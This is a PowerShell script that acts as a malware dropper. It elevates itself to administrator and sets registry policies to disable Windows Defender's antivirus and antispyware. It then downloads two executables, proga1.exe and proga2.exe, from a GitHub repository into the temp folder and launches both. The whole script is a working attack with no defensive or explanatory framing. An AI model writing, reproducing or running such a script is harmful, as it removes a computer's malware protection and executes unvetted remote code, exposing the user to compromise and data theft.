Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
    $workingDirOverride = (Get-Location).Path 
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        Read-Host "Press Enter to exit"
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

Write-Host "=== Disabling Windows Defender ===" -ForegroundColor Yellow

$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"

if (!(Test-Path $DefenderPath)) { 
    New-Item -Path $DefenderPath -Force 
}
New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force -ErrorAction SilentlyContinue

try {
    Set-ItemProperty -Path $DefenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction Stop
    Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWord -Force -ErrorAction Stop
    Write-Host "Windows Defender DISABLED" -ForegroundColor Green
} catch {
    Write-Host "Failed to set registry values: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""
Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow

$temp = $env:TEMP
$downloaded = 0

function Download-File {
    param($url, $dest)
    
    if (Test-Path $dest) { 
        Remove-Item $dest -Force -ErrorAction SilentlyContinue 
    }
    
    Write-Host "Downloading from: $url" -ForegroundColor Gray
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $dest)
        $webClient.Dispose()
        
        if ((Get-Item $dest).Length -gt 0) {
            Write-Host "Download SUCCESS: $((Get-Item $dest).Length / 1KB) KB" -ForegroundColor Green
            return $true
        } else {
            Write-Host "Download FAILED: File is empty" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "Download FAILED: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

Write-Host "Checking internet..." -ForegroundColor Gray
try {
    $null = Invoke-WebRequest -Uri "https://github.com" -TimeoutSec 5 -UseBasicParsing
    Write-Host "Internet: OK" -ForegroundColor Green
} catch {
    Write-Host "Internet: WARNING - $($_.Exception.Message)" -ForegroundColor Yellow
}

$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$dest1 = "$temp\proga1.exe"

Write-Host "`n[1/2] Downloading proga1.exe..." -ForegroundColor Cyan
if (Download-File $url1 $dest1) {
    $downloaded++
} else {
    Write-Host "FAILED to download proga1.exe" -ForegroundColor Red
}

$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
$dest2 = "$temp\proga2.exe"

Write-Host "`n[2/2] Downloading proga2.exe..." -ForegroundColor Cyan
if (Download-File $url2 $dest2) {
    $downloaded++
} else {
    Write-Host "WARNING: proga2.exe not found, creating copy..." -ForegroundColor Yellow
    if (Test-Path $dest1) {
        Copy-Item $dest1 $dest2 -Force
        Write-Host "Created proga2.exe as copy of proga1.exe" -ForegroundColor Green
        $downloaded++
    } else {
        Write-Host "ERROR: Cannot create proga2.exe" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "=== Running Files ===" -ForegroundColor Yellow

if (Test-Path $dest1) {
    Write-Host "Starting proga1.exe..." -ForegroundColor Green
    Start-Process -FilePath $dest1 -WindowStyle Normal
    Write-Host "proga1.exe started" -ForegroundColor Green
} else {
    Write-Host "proga1.exe not found!" -ForegroundColor Red
}

if (Test-Path $dest2) {
    Start-Sleep -Seconds 2
    Write-Host "Starting proga2.exe..." -ForegroundColor Green
    Start-Process -FilePath $dest2 -WindowStyle Normal
    Write-Host "proga2.exe started" -ForegroundColor Green
} else {
    Write-Host "proga2.exe not found!" -ForegroundColor Red
}

Write-Host ""
Write-Host "=== ALL DONE ($downloaded/2 files) ===" -ForegroundColor Green
Write-Host ""
Write-Host "Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
